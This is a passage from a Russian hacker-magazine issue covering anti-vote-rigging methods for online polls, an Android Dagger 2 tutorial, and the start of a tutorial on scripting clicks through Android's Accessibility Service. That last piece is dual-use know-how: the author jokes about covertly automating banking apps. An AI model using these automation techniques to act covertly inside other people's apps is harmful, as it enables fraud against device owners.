как перенос голосования со своего ресурса в социальные сети. VK, FB, Twit‐
ter и прочие пожиратели рабочего времени позволя ют организовывать опро‐
сы, тем самым беря на себя и защиту от накрутки и сопутству ющих проблем.
   Убивается сразу несколько зайцев: программировать ничего не надо
и заставлять пользователя регистрироваться тоже. Аккаунты в популярных
социальных сетях есть у каждого или почти у каждого. Наличие аккаунта —
уже своеобразная защита от накрутки. Плюс появ ляется возможность сег‐
ментировать аудиторию. Например, твой запрос заточен больше на ауди‐
торию Twitter’а, тогда нет смысла заморачиваться позволять голосовать учас‐
тникам других соцсетей.
   Если ни одна из социальных сетей не подходит для проведе ния опро сов,
можно организовать сам опрос у себя на ресурсе, но предоставить поль‐
зователям возможность голосовать после предварительной авторизации
через соцсеть.
   Дальше все зависит от твоей фантазии: можно отсе кать пользователя
по его городу или другим критериям. Например, голосо вать могут участники
определенной группы, в которую вступают по одоб рению модераторов. Спо‐
соб гаран тирует практически стопроцентную защиту, но подойдет далеко
не во всех случаях. Если нет активного сооб щества — ничего не получит ся.


Минусы
Пробить можно количеством друзей или фейковыми аккаунтами. С пос‐
ледним можно бороться, вводя дополнительные фильтры (например, город),
но говорить с полной уверенностью, что это поможет, нельзя. В Сети
навалом всевозможных бирж, где за небольшую сум му можно набрать «доб‐
ровольцев», которые с радостью проголосуют за нужный вариант, да еще
и оставят осмысленный комментарий.


Вердикт
Очевидным «за» будет легкость реализации, а очевид ным «против» — рас‐
пространен ность бирж с реальными пользователями, готовы ми голосовать
за вознаграждение. Дополнительные фильтры помогут отсечь левых участни‐
ков, но ненадолго. Если требует ся быстро запустить голосование/опрос,
не доставляя пользователям сложностей и без лишних переживаний о нак‐
рутке, — вариант отличный.


Как реали зовать
Смотрим инструкцию определенной социальной сети (как организовывать
опросы), а при желании прикрутить авториза цию через соцсеть на своем
ресурсе обращаемся за помощью к различным библиотекам, API соцсетей
и официальной документации для разработ чиков. Фанатам Node.js рекомен‐
дую присмотреться к passport.js.


ПОВЕДЕНЧЕСКИЕ ФАКТОРЫ
Прекрасной защитой  от ботов  будет внедрение  методов, осно ванных
на поведенческих факторах. Ничто не меша ет нам собирать при переходе
на страницу с голосованием вот такие парамет ры:
 • время нахождения на стра нице после ее полной загрузки. Пользователь
   должен как минимум вдумчиво прочитать варианты опроса, а на это тре‐
   буется время;
 • действия на стра нице. Скролл (например, до формы с голосо ванием),
  перемещение курсора мыши над варианта ми ответа, каким образом
   выполнялся клик (мышкой или кла виатурой) и так далее.

На основании этой информации делаем соот ветствующие выводы и впос‐
ледствии фильтру ем пользовате лей, которых инте ресовал не опрос,
а выпол нение чьей‑то просьбы проголосовать за определенный вариант.


Минусы
Сложность прог раммирования и анализа. Сбор мет рики и написание алго‐
ритма анализа данных потребует времени и хорошего опы та программирова‐
ния. Если действовать «в лоб», то можно натупить и сбросить с учета голоса
реальных пользователей.


Вердикт
Если ты серьезно подходишь к организа ции голосования, то однозначно сто‐
ит продумать стратегию оценки поведенческих факторов участника голосо‐
ваний. Чем больше времени будет этому уделено, тем лучше получит ся
зачистить результаты от накрутки.


Как реали зовать
Продумать и прописать на бумаге сценарии поведения пользователя, а затем
собрать все необходимое с помощью JavaScript.


СОВМЕЩАЕМ ОНЛАЙН С ОФЛАЙНОМ
Этот способ актуален для компаний, занимающихся продажей реальных про ‐
дуктов (журнальчиков или газировки, например). Спо соб прост до безоб‐
разия и успешно применяется различными изда ниями, компаниями вроде
Pepsi или Coca‐Cola. Берем офлайн‐продукт и где‐нибудь на упаковке
печатаем уникальный цифровой код, с помощью которого точно можно иден‐
тифицировать пользователя.
   Это может быть уникальный набор цифр/букв (вспоминаем конкурсы
с призами из‐под крышки) или даже современный QR‐код. Участник голосо‐
вания покупает продукт и гарантированно получа ет один шанс для голосо‐
вания. Безусловно, потребитель способен закупить целый вагон продуктов
или искать бутыл ки/чеки по помойкам :), но мы понимаем, что на это нужны
огромные ресурсы.


В СТИЛЕ RANDOM
Мы рассмотрели несколько вариантов защиты от накрутки. Ты убедился, что
добиться стопроцентного успеха в этом деле невозможно. Любая защита
имеет слабые места, а раз так, то при желании и наличии вре мени ее воз‐
можно пробить. Все зависит от конеч ной цели и награды. Если цель голосо‐
вания — выбрать самую сексуальную сотрудницу ООО «Рога и копыта»,
а приз — коробка конфет, то вряд ли у кого‐то появится желание копаться
и анализировать алгоритм голосования с целью накрутки.
  Совсем другое дело, если победитель должен получить новенький Range
Rover. Тут ценность заметно выше и халяв щиков будет больше.
  Каждый из описанных способов защиты хорош по‐своему. Не стоит
выбирать из них самый лучший — его по определению не существует. Сфо ‐
кусируйся на создании нескольких линий защит. Миксуй различные спо собы
и во время проведения опросов держи руку на пульсе. Постоянно мониторь
результаты и анализируй поведение участников. Помни: многие проблемы
решить проще, если своевременно о них узнать.


Будут вопросы — смело пиши в комменты! Если возникнет желание про честь
более наполненную кодом статью, смело требуй, и мы ее сделаем :). Просто
этот обзор способов защиты от накрутки уже сам по себе объемный: целых
четыре полосы, если считать по страницам ста рого бумажного «Хакера».



        WWW

                           •https://ru.wikipedia.org/wiki/HTTP_ETag —  под‐
                        робная информация о ETag.
                             •https://www.hurl.it/ — хороший сервис для соз‐
                        дания и тестирова ния HTTP‐запросов.
                             •https://panopticlick.eff.org/ — открытый проект,
                       демонстри рующий определение уникальнос ти
                         пользователя на осно вании раз личных кри тери ‐
                             ев.
                           •https://amiunique.org/ — еще один сервис, поз‐
                         воля ющий  проверить  и  идентифици ровать
                         пользователя по различным параметрам. Идея
                           такая же, как и у Panopticlick, но в определении
                       «цифрового   отпечатка»   участвуют   другие
                        параметры. Исходный код проекта дос тупен
                         на GitHub.
                              •https://clientjs.org/ — достой ная альтер натива
                                Fingerprint.js.
                          •https://habrahabr.ru/company/oleg‐
                           bunin/blog/321294/ —  док лад  автора  Finger‐
                                  print.js о раз личных способах идентификации
                         пользователей.
                           •https://habrahabr.ru/post/244779/ — добротный
                         гайд по интеграции reCAPTCHA 2.
КОДИНГ

СПАСИТЕЛЬНАЯ
ИНЪЕКЦИЯ


                                                                     Андрей Пахомов
                                                                                mailforpahomov@gmail.comDAGGER 2





ОЖИВЛЯЕМ ПРОЕКТ С ПОМОЩЬЮ КРУТОГО
           ФРЕЙМВОРКА



Если тебе приходилось переписывать старый код только
для того, чтобы он заработал в новом проекте, значит, ты
кое‐что упустил. Наш журнал спешит на помощь, срочно
выкидывай «костыли» и «ржавые велоси педы» — с этого дня
твоя жизнь кру то поменяется. :)


БАГАЖ ЗНАНИЙ
Уверен, ты не раз пытался создать уникальное Android‐приложение, сов‐
местив фун кциональность нескольких старых проектов, но вот беда — ранее
написанные классы никак не хотели работать вместе. Тогда ты начинал их
активно рефакторить, переписывая метод за методом. В результате либо
получал ся совсем новый код, либо проект так и не выходил в релиз.


        WWW

                      Если ты при соединился  к мощнейшей армии
                     наших читателей недавно, советую тебе прочесть
                    мои предыдущие статьи на тему Android‐раз ‐
                       работки. Тем более что я часто на них ссылаюсь
                        в новых материалах. :)


Причиной всех этих переделок была классическая для ООП проблема связ -
ности кода: для функционирова ния одного объекта тре буются два других, а в
них нужно инициализировать еще несколько.


public class DoTheJob {
   public doTheJob(Context ctx, String path, Boolean isRecursive …)

Когда класс DoTheJob создавал ся, все могло быть вполне логич но, но теперь
его легче полностью переписать, чем адаптировать под новые задачи, —
для создания объекта требует ся много параметров, причем нет уверенности,
что они несут полезную нагрузку.
   Теперь придется долго рефакторить код, убирая лишнее, иначе приложе‐
ние будет съедать слишком много памяти. Совсем недавно мы рассмотрели
паттерн MVP, и он, конечно, поможет как‐то адаптировать такой код. А иногда
новые объекты появляют ся совсем неожиданно, и за ними тоже надо следить.


AlienClass alien;
...
@Override
protected void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 alien = new AlienClass(this);
 ...

Объект alien, возможно, и выпол няет полезную работу, но не факт, что она
нужна в новом проекте. К тому же ему передается ссылка на Activity, а значит,
это потенциальный канал утечки памяти. Придет ся вникать, для чего этот alien
нужен и когда его можно будет уже выгрузить из памяти. Все идет к тому, что
на этапе тестирования придет ся удалить весь старый код и заречься ког‐
да‐либо его использовать.
   Естественно, сложности с повторным использованием кода появились
задолго до изобретения ОС Android. Постепенно вырабо тался универсаль‐
ный подход к решению таких проблем — это пат терн «Инъекция зависимос‐
тей», или DI‐паттерн.
   Как ты уже понял, главная проблема интеграции написанного ранее
кода —  это  необходимость  инициализации  каких‐то  других  классов,
от которых он зависит. Когда в середине кода встречается генерация новых
объектов, то считается, что у класса есть зависимость (dependency).


public class A {
   public void doSmth() {
    B b = new B(this);
    b.generateData(); }...

Разрешать такие зависимости можно по‐разному, но удобнее все го передать
уже существующий объект через конструкторы или set‐метод.


public class A {
   public A(B obj)
    {b=obj;}
   public void doSmth()
 {b.generateData(); }...





            Рис. 1. Отличие прямой зависимости и ее инъекции

Теперь связность кода ста ла меньше, объ ект класса B получен в виде ссылки
и внутри класса A не нужно заботиться о его генерации. Такой подход
называется инъекцией зависимости (dependency injection).
  Но есть одна проблема — у класса B могут быть свои зависимости,
у которых, в свою очередь, будут еще зависимости. В результате получается
цепочка классов, часть из которых нам совершенно не нужна. Сразу воз‐
растает вероятность дублирова ния объектов, легче «забыть» их в памяти и,
как следствие, исчерпать все ресурсы приложения.
  К счастью, всё это предусмотрели! Реализуя DI‐паттерн, программист
дол жен создать некий контейнер, который будет хранить в себе все необ‐
ходимые проекту зависимости.


class1 => array("Dependency1", "Dependency2" ...)

И каждый раз, когда потребуется удовлетворить какую‐то зависимость, ее
можно просто получить из контейнера. При этом контейнер будет не только
выдавать объекты, но и следить за их жизненным цик лом: не плодить новые
без необходимости и выгружать старые, когда они уже точно станут не нужны.
Удовлетворение зависимостей кода через умный контейнер — суть DI‐пат ‐
терна.


DAGGER 2
Хорошая новость: такой контейнер самому писать не надо. В Java есть нес‐
колько реализаций этого паттерна, в мире Android это фреймворк Dagger. Его
первая версия появилась несколько лет назад, и он сразу пришелся раз‐
работчикам по вкусу. Вскоре компания Google начала развивать его самос‐
тоятельно, выпустив сильно допол ненную версию, и называется он теперь
Dagger 2.
  Фреймворк сам построит связи между объектами и будет контролировать
их жизненный цикл. В отличие от библиотек и фреймворков, которые мы уже
разбирали раньше, Dagger 2 разрешает получив шиеся зависимости только
на этапе компиляции программы.


СТРУКТУРА
В Dagger 2 есть несколько базовых ком понентов, на которых будет стро иться
приложение. Чтобы лучше понять происходящее, коротенько пробежимся
по их функциональным возможностям.
 • Singletones (синглтоны, или одиноч ки) — это все те классы, которые уже
  были тобой написаны и ждут своей интеграции: сетевые запросы, кеширо ‐
   вание и так далее. «Одиночество» заключа ется в том, что Dagger 2 пол‐
   ностью контролирует их жизненный цикл и не позволяет приложению
   генерить таких объектов больше, чем необходимо.
 • Modules (модули) — набор классов, описывающих поведе ние синглто‐
   нов. Фреймворк позволяет гиб ко кон фигурировать правила исполь‐
   зования объектов, модули нужны именно для этого.
 • Component (компонент) — хранит в себе ссыл ки на все необ ходимые
   части приложения: синглтоны, модули, активити и другие. Фреймворк
   будет инжектировать зависимости на основе данных, полученных из ком‐
   понента.
 • Класс Application — не сов сем часть фреймворка, но важная составля‐
   ющая. Сгенерированный код должен функционировать на протяже нии
   жизни всего приложения, от самого старта и до конца. За жизненный цикл
   приложения в целом отвечает класс Application, его нужно будет рас‐
   ширить и вставить туда запрос на инициализацию фреймворка.





  Рис. 2. Схема работы фреймворка Dagger 2


СОБЕСЕДОВАНИЯ
Еще одна причина использовать «ста рый» код — это эко номия собственного
времени при создании маловажных проектов. Например, быстро написать
стабильный  код  может  понадобиться  на  собеседовании.  Кандидатов
на вакансию Android‐разработчика обычно просят написать приложение, заг‐
ружающее данные из сети с последующим выводом на экран и кеширо вани‐
ем в базу. В целом это простые задачи, которые встречаются прак тически
в каждом проекте. Но задания всегда немного различаются, а переписывать
код не хочется. Если времени на бесплатную работу нет, а результат нужен —
значит, пора использовать фреймворки!


СИНГЛТОНЫ
К коду синглтона нет особых требований, главное, чтобы не было внезапных
зависимостей внутри метода и других велосипедов. Создавать приложение я
решил с сетевой части — в этом мне поможет библиотека Retroﬁt.


public class RetrofitLoader {
 public RetrofitLoader()
  {}

Для построения запроса нужны только адрес и тип запроса, остальные
параметры добавятся автоматически. Запросы в сеть всегда выполняют ся
в отдельном потоке, ответ не придет мгновенно, и нужно задать будущий
обработ чик‐получа тель. Чтобы не плодить лишние ссылки внутри синглтона,
отправку такого запроса инициируем поз же, уже в Activity. В итоге от синглто ‐
на нужен только сформированный запрос, который Retroﬁt хранит в объекте
класса Call.


public Call retrofitLoad(String url)
 {JsonInterface mainNewsInterface;
  ...
  mainNewsInterface = retrofit.create(JsonInterface.class);
  Call<List<ContactJson>> call = mainNewsInterface.loadMainNews();
  return call;}

Теперь на очереди база данных, синглтон для работы с ней я решил взять
из моей прошлой статьи. Та реализация полностью подходит, я только
добавил еще один конструктор, убрав лишние параметры.


public class DummySQLite extends SQLiteOpenHelper implements DAO {
 public DummySQLite(Context context)
  {super(context, DATABASE_NAME, null, DATABASE_VERSION);} …


МОДУЛИ
Поскольку весь нужный код фреймворк сгенерирует сам на этапе ком‐
пиляции, тебе остается только правильно передать парамет ры инъекции. Они
передаются через аннотации — специальный тег перед именем класса,
метода или перемен ной. Первым делом нужно указать фреймворку, что этот
класс является модулем.


@Module
public class NetworkModule {

Dagger 2 загружает синглтоны через специально отмеченные get‐методы
внутри модулей. Исходный код синглтона можно расположить как в отдель‐
ном классе, так и внутри модуля — все зависит от удобства.


@Provides @Singleton
RetrofitLoader getNetworkLoader()
 {return new RetrofitLoader();}

Обрати внимание на мет ку Singleton — она указывает фреймворку, что
в памяти приложения должен быть только один объект класса RetroﬁtLoader.
Это  помогает  не  плодить лишние сущности,  уберегая  программиста
от коварного бага — утечки памяти.
  Еще у provide‐методов есть одно важное правило: они должны вызываться
без параметров. Если генерируемый синглтон не может обойтись без внеш‐
них зависимостей, то их нужно передавать через конструк тор модуля. В этом
случае базе дан ных для работы обязательно требуется контекст приложения.


@Module
public class DBModule {
 DaggerApp daggerApp;
 public DBModule(DaggerApp daggerApp)
  {this.daggerApp=daggerApp;}

Интересно, что у provide‐методов могут быть абсолютно любые названия,
фреймворк их найдет по аннотации и типу возвращаемого значения.


@Provides @Singleton
public DummySQLite provideDummySQLite()
 {return new DummySQLite(daggerApp.getApplicationContext());}


КОМПОНЕНТ
А теперь пора собрать вместе модули и синглтоны с аннотациями. Парамет‐
ры компонента также задаются аннотациями — он должен быть единствен‐
ным (Singleton) и содержать в себе требуемый набор модулей.


@Singleton
@Component(modules = {DBModule.class, NetworkModule.class})
public interface CustomComponent {

Компонент представляет собой интерфейс, из которо го потом фреймворк
самостоятельно сгенерирует объ ект. От списка объявленных в интерфейсе
методов зависит, куда именно будут инжектироваться синглтоны, в нашем
случае мы обойдемся классом MainActivity.


void inject(MainActivity activity);

Если бы мы использовали фрагменты или сер вис, то ниже нужно было бы
добавить схожие строчки.


void inject(Fragment fragment);
void inject(Service service);

Вообще, аннотации в Dagger 2 имеют очень большую силу. К примеру,
инжектированные объекты будут жить в памяти, пока приложение полностью
не закроется, и это может быть излишним. Укоротить жизнь синглтона можно
также с помощью аннотации.


@Scope
@Documented
@Retention(value=RetentionPolicy.RUNTIME)
public @interface ActivityOnly
{}….

Для этого пришлось создать собственную аннотацию ActivityOnly. Она укажет
компоненту, что синглтоны дол жны быть выгружены из памяти вслед за ком‐
понентом, для которого они предназначены.


...
@ActivityOnly
public interface CustomComponent {...

И это еще не все возможности аннотаций, но мы не будем сегодня вдаваться
в подробности — когда ты втянешься в разработку с помощью Dagger 2, смо‐
жешь разобраться с ними самостоятель но.


APPLICATION
Синглтоны будут инжектироваться в объект класса MainActivity, значит, сам
фреймворк должен начать работы еще раньше. В классе Application есть свой
метод onCreate, который будет вызван системой еще до старта каких‐либо
Activity, — имен но сюда мы и добавим инициализацию Dagger 2.


public class DaggerApp extends Application {
 CustomComponent component;

Объект  CustomComponent  получается  из  одноименного  интерфейса
с помощью небольшой магии Dagger 2. Он создается с помощью билдера
DaggerCustomComponent, код которого будет сгенерирован фреймворком
самостоятельно уже на этапе компиляции. Наша задача — только правильно
задать имя еще не существующего билдера: Dagger+Имя_компонента.
Во время работы Android Studio может ругаться на незнакомый класс Dagger‐
CustomComponent, это лечится командами Clean и Rebuild.


@Override
public void onCreate() {
super.onCreate();
component= DaggerCustomComponent.builder()
 .networkModule(new NetworkModule())
 .dBModule(new DBModule(this))
 .build();}

Если у модулей есть какие‐то входные парамет ры, то они будут задаваться
тут. Чтобы фреймворк загрузил ся, необходимо также в манифесте подпра‐
вить тег application, указав имя созданного нами наследника одноименного
класса.


<application
 android:name=".DaggerApp … />


MAINACTIVITY
Внутри активити кода совсем мало. Достаточно только объявить необ‐
ходимые объекты, указав, что они должны быть инжектированы.


@Inject
DummySQLite dummySQLite;
@Inject
RetrofitLoader retrofitLoader;

Но сразу же при старте компонента в системе они не появятся, необходимо
вызвать метод inject.


((DaggerApp)getApplication()).getComponent().inject(this);

На этом все, DI‐паттерн реализован! Теперь в нашем распоряже нии весь
арсенал возможностей синглтонов, при этом они находятся под бдительным
контролем фреймворка. Тут магии никакой нет, Dagger 2 написал за нас
очень много кода — сгенерированные классы лежат в папке app/build/gener‐
ated.
  Отмечу, что инжектируют код обычно только в базовые компоненты An‐
droid‐приложений: Activity, Fragment и различные сер висы. У таких классов нет
конструкторов с парамет рами, передавать им дан ные нужно другими спо‐
собами. Для простых случаев есть такие инстру менты, как SharedPreferences
и Bundle, а для целых объ ектов лучше прибегнуть к DI‐пат терну.
  Использовать инъекции для собственных классов довольно накладно:
все‐таки генерируется слишком много вспомога тельного кода. Лучше про ‐
вести рефакторинг и передать объекты через конструк тор или set‐методы.


UI
Запол нять визуальные элементы можно разными способами, что‐то инжекти‐
ровать тут совсем не нужно. Обычно большой список данных отображается
пользователю с помощью класса RecyclerView.


recyclerView.setAdapter(new CustomAdapter(response.body()));
recyclerView.setLayoutManager(new StaggeredGridLayoutManager(2,1));

Мы часто про него писали, поэтому повторяться не будем, но в полном лис‐
тинге получившегося приложения UI будет тоже реализован.


ЗАКЛЮЧЕНИЕ
Как ты смог убедиться, фреймворки сильно упрощают жизнь. Исходный код
не стыдно показать потенциальному работодателю — тут нет костылей,
получившийся код легко читать и поддерживать. Использование Dagger
2 дает много очевидных преимуществ: легче наладить распределенную раз‐
работку, тестировать компоненты и добавлять новые функции. По сути, наша
программа состоит из нескольких модулей, которые абсолютно не свя‐
заны, — это и делает Dagger 2 таким популярным.





  Рис. 3. Часто использование Dagger 2 — обязательное требование

Если остались какие‐то вопросы или хочешь, чтобы я принял участие в тво ем
проекте, — пиши в комменты или на почту, обязательно отвечу. Удачи!


        WWW

                    •Объяснение сути DI‐паттерна за три минуты
                    •База дан ных в Android
                    •Быстрый способ создать UI
КОДИНГ
 СЕРВИС
(НЕ)ОГРАНИЧЕННЫХ
  ВОЗМОЖНОСТЕЙ





                                   Владимир Тимофеев
                                                         android‐tools.ru




     «ПОМОГАЕМ» ПОЛЬЗОВАТЕЛЮ
      В РАБОТЕ С ПРОГРАММАМИ




И программистам, и хакерам, и безопасникам иногда нужны
способы автоматизировать поль зовательские действия — то
есть писать скрипты, которые будут тыкать в кнопки чужих
софтин так, чтобы те принимали это чистую монету. Кто ска‐
зал «негласно автоматизировать работу с мобильным бан‐
ком»? :) Стыдитесь, товарищ! Мы за мирную автоматизацию.
В прошлой статье по Accessibility Service мы сфокусирова‐
лись на получении данных экра на, а сегод ня мы научим Ac‐
cessibility Service делать работу на устройстве за нас!


        WWW

                     Опыт автора:  «Как я ковырял чужой код. Что
                       полезного можно найти внутри известных при‐
                      ложений для Android»



ПОНАЖИМАЙ ЭТИ КНОПКИ ЗА МЕНЯ
Еще  в  XIX веке  Гегель  ска зал: «Машиноподоб ный  труд нужно  отдать
машинам». И тут с одним из творцов немецкой классической филосо фии
трудно поспорить: вряд ли Георг Виль гельм Фридрих отказался бы от авто‐
матизации таких действий, как отключение звука и нажатие кнопки «Пропус‐
тить рекламу» при просмотре ролика в YouTube или получение ежедневных
бонусов за посещение приложения. Тем более что для всего этого у нас уже
есть готовый инструмен тарий!
   Как мы говорили в предыдущей статье, Accessibility Service может получать
события, происходящие на экране, но он же может и вызывать их. Например,
на ходить нужные эле мен ты в приложении и кликать по ним.
   Ставить чужое приложение с подобной функциональностью опасно — все
мы знаем репутацию Google Play и примерно представляем себе, что такое
приложение может сделать с твоим банковским клиентом на телефо не.
Поэтому выхода два: либо декомпилировать чужое ПО и смотреть, куда имен‐
но оно нажимает, либо пилить свое, строго под поставленные задачи.
  Для исследовательских целей я создал приложение, которое будет само
в себя кликать из собственного сервиса :).


ПОДГОТОВКА К РАБОТЕ СЕРВИСА
Чтобы наш сервис начал работу, ему нужно пре дос тавить права в специаль‐
ном разделе настроек. Как перенаправить туда пользовате ля, ты уже знаешь
из первой статьи. Дополнитель но мы сами можем перепроверить, есть ли эти
права у приложения.


 protected boolean checkAccess() {
    String string = getString(R.string.accessibilityservice_id);
    for (AccessibilityServiceInfo id : ((AccessibilityManager) getSys
temService(Context.ACCESSIBILITY_SERVICE)).getEnabledAccessibilityS
erviceList(AccessibilityEvent.TYPES_ALL_MASK)) {
        if (string.equals(id.getId())) {
            return true;
        }
    }
    return false;
}

Здесь accessibilityservice_id — это строка вида «имя пакета/.сервис», у нас
это ru.androidtools.selfclicker/.ClickService.
   Вот описание сервиса из манифеста:


<service
    android:name="ru.androidtools.selfcliker.ClickService"
    android:label="@string/accessibility_service_label"
    android:permission="android.permission.BIND_ACCESSIBIL
ITY_SERVICE">
    <intent‐filter>
        <action android:name="android.accessibilityservice.Access
ibilityService" />
    </intent‐filter>
    <meta‐data
        android:name="android.accessibilityservice"
        android:resource="@xml/serviceconfig" />
</service>

Параметр label отвечает за название приложения в настройках сервиса спец‐
возможностей. В разделе meta‐data задается указание на описание нужных
функций для работы сервиса. Вот файл serviceconfig :


<accessibility‐service xmlns:android="http://schemas.android.com/apk/
res/android"
android:accessibilityEventTypes="typeWindowStateChanged|typeWi
ndowContentChanged"
android:accessibilityFlags="flagDefault|flagIncludeNotImportantV
iews|flagReportViewIds"
android:canRetrieveWindowContent="true"
android:settingsActivity="ru.androidtools.selfcliker.MainActivity" />

В нем мы описыва ем полномочия сервиса, типы событий, которые он может
обрабатывать, и активити, которое запустится для настройки работы сервиса.
  Полное описание этих параметров, как всегда, есть в документации.





                        checkAccess() вернул false!

Жизненным циклом сервиса управляет система. Сами остановить сервис мы
не можем. ОС самостоятельно выгрузит ненужные сервисы — к примеру,
зачем крутить сервис для приложения, которое не запущено?
  Мы можем привязать сервис к строго нужному приложению. Как только мы
дали   разрешение   на   работу,    у   сервиса   вызовется   метод
onServiceConnected. У него мы должны вызвать метод setServiceInfo()
с  параметром   AccessibilityServiceInfo.  За  фильтрацию  приложений,
с которыми работает сервис, отвечает строковый массив packageNames .


@Override
protected void onServiceConnected() {
    super.onServiceConnected();
    Log.v(TAG, "onServiceConnected");
    AccessibilityServiceInfo info = new AccessibilityServiceInfo();
    info.flags = AccessibilityServiceInfo.DEFAULT |
            AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
 |
            AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
    info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
    info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
    info.packageNames = new String[]{"ru.androidtools.selfcliсker"};
    setServiceInfo(info);
}





                           Да, он точ но будет


РАБОТАЕМ С СОБЫТИЯМИ ACCESSIBILITYEVENT
После раздачи всех разрешений нам надо запустить нужное приложение.
Если мы знаем его имя пакета, сделать это несложно:


 private void startApp() {
    Intent launchIntent = getPackageManager().getLaunchIntent
ForPackage("ru.androidtools.selfclicker");
    // Запуск из нужного места без предыстории приложения
    launchIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    startActivity(launchIntent);
}

Для  запуска  приложения  с  чистого  листа  используем  флаг  Intent.-
FLAG_ACTIVITY_CLEAR_TOP. В против ном слу чае приложение может вер‐
нуться на экран со старым состоянием, очень далеким от стартового экрана.
   Теперь нужно обрабатывать события  в методе  onAccessibilityEvent.
У события есть тип, он поможет определить, что произошло (например, сме‐
нилось окно, кликнули по элементу, элемент получил фокус). Чтобы получить
источник события AccessibilityNodeInfo, надо у объекта события вызвать
метод getSource().
  Источник имеет много полезных свойств, помогающих в работе: текст, ID,
имя класса. У него могут быть родительский и дочерние элементы.
  Он может быть кликабельным isClickable(), и, чтобы щелкнуть по нему,
как нормаль ный пользователь, нужно вызвать метод performAction(Accessib-
ilityNodeInfo.ACTION_CLICK).
   Если мы хотим более глобальных действий, например на жать клавишу
«Назад» на устройстве, то следует вызвать метод performGlobalAction()
с нужным параметром.
   Чтобы найти на экране требующуюся AccessibilityNodeInfo, мы можем
вызвать один из методов: поиск по ID (ﬁndAccessibilityNodeInfosByViewId)
и поиск по тексту (ﬁndAccessibilityNodeInfosByText). Будь готов к тому, что он
вернет нам массив элементов или вообще ни одного.


ПОТРЕНИРУЕМСЯ НА КОШКАХ, ТОЧНЕЕ — НА ОКОШКАХ
Вот разметка нашего подопыт ного экрана:


<?xml version="1.0" encoding="utf‐8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/
android"
    android:id="@+id/activity_main"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin">
    <Button
        android:id="@+id/buttonTest"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center_horizontal"
        android:onClick="testButtonClick"
        android:text="id/buttonTest" />
    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center_horizontal"
        android:text="Без ID"
        android:onClick="noIdClick" />
    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="@color/colorAccent"
        android:onClick="linearLayoutClick"
        android:orientation="vertical">
        <TextView
            android:id="@+id/textView"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_horizontal"
            android:text="Кликабельный LinearLayout"
            android:textAppearance="@android:style/TextAppearance.
DeviceDefault.Large" />
        <Button
            android:id="@+id/button3"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center_horizontal"
            android:text="Нерабочая кнопка" />
    </LinearLayout>
</LinearLayout>

У некоторых элементов есть ID и текст, у других только текст, некоторые нек ‐
ликабельны.
   Иногда обработчики кликов устанавливают на области, превышающие
своими размерами элемент с текстом или картинкой.
  Поизучаем эту задачу с помощью метода debugClick.


 private void debugClick(AccessibilityEvent event) {
    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED)
 {
        AccessibilityNodeInfo nodeInfo = event.getSource();
        if (nodeInfo == null) {
            return;
        }
        nodeInfo.refresh();
        Log.d(TAG, "ClassName:" + nodeInfo.getClassName() +
                " Text:" + nodeInfo.getText() +
                " ViewIdResourceName:" + nodeInfo.getViewIdResour
ceName() +
                " isClickable:" + nodeInfo.isClickable());
    }
}

Вот что вышло в лог:


03‐03 16:23:15.220 24461‐24461/ru.androidtools.selfclicker D/ClickS
ervice: ClassName:android.widget.Button Text:ID/BUTTONTEST ViewId
ResourceName:ru.androidtools.selfclicker:id/buttonTest isClickable:
true
03‐03 16:23:26.356 24461‐24461/ru.androidtools.selfclicker D/ClickS
ervice: ClassName:android.widget.Button Text:БЕЗ ID ViewIdResourceN
ame:null isClickable:true
03‐03 16:23:36.697 24461‐24461/ru.androidtools.selfclicker D/ClickS
ervice: ClassName:android.widget.LinearLayout Text:null ViewId
ResourceName:null isClickable:true
03‐03 16:23:44.320 24461‐24461/ru.androidtools.selfclicker D/ClickS
ervice: ClassName:android.widget.Button Text:НЕРАБОЧАЯ КНОПКА ViewId
ResourceName:ru.androidtools.selfclicker:id/button3 isClickable:true

Чтобы вос произвести пос ледовательность кликов , нужно сначала изу чить
элементы, которые будут нажиматься. Но иногда также важна и последова‐
тельность их нажатий.
  Для нажатий на первые две кнопки можно использовать findAccessibilityN-
odeInfosByText и findAccessibilityNodeInfosByViewId. Если текст у элементов
повторяется, дополнительно можно проверять на ClassName или родите ля.
   Чтобы кликнуть в наш LinearLayout, нужно получить его AccessibilityNode-
Info, ID у него нет, но есть дочерние элементы TextView и Button, у которых
есть текст.
  Для начала нам нужно получить один из них, а потом клик нуть в его
родителя.


private boolean linearClick(AccessibilityNodeInfo nodeInfo) {
    List<AccessibilityNodeInfo> list = nodeInfo.findAccessibili
tyNodeInfosByText("Нерабочая кнопка");
    if (list.size() > 0) {
        for (AccessibilityNodeInfo node : list) {
            AccessibilityNodeInfo parent = node.getParent();
            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        return true;
    } else
        return false;
}

Бывают и обратные ситуации, когда есть родитель, а кликаем мы в дочерние.
Для этого используй nodeInfo.getChildCount() и обра щайся к элементу в цик ‐
ле по ID nodeInfo.getChild(id) (если не ошибаюсь, нумерация ID идет с нуля).
  Начинать работу сервиса луч ше с события смены окна:


event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED

Если весь алгоритм действий уже готов, то можно запускать сервис авто‐
матически через AlarmManager, например раз в сут ки.


private void setRepeatTask() {
    Intent alarmIntent = new Intent(this, ClickService.class);
    PendingIntent pendingIntent = PendingIntent.getService(
        this, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
